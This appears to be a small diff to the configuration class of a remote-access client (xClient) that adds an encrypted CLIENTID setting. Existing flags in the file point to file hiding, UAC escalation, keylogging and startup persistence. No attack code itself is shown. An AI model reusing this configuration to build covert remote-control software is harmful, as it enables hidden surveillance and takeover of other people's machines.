@@ -2,6 +2,7 @@
 
 #if !DEBUG
 using xClient.Core.Encryption;
+using System.Windows.Forms;
 #endif
 
 namespace xClient.Config
@@ -24,7 +25,7 @@ namespace xClient.Config
         public static bool HIDEFILE = false;
         public static bool ENABLEUACESCALATION = false;
         public static bool ENABLELOGGER = true;
-
+        public static string CLIENTID = "Default";
         public static void Initialize()
         {
         }
@@ -45,6 +46,7 @@ namespace xClient.Config
         public static bool ENABLEUACESCALATION = true;
         public static bool ENABLELOGGER = true;
         public static string ENCRYPTIONKEY = "ENCKEY";
+        public static string CLIENTID = "Default";
 
         public static void Initialize()
         {
@@ -55,6 +57,7 @@ namespace xClient.Config
             INSTALLNAME = AES.Decrypt(INSTALLNAME, ENCRYPTIONKEY);
             MUTEX = AES.Decrypt(MUTEX, ENCRYPTIONKEY);
             STARTUPKEY = AES.Decrypt(STARTUPKEY, ENCRYPTIONKEY);
+            CLIENTID = AES.Decrypt(CLIENTID, ENCRYPTIONKEY);
         }
 #endif
     }
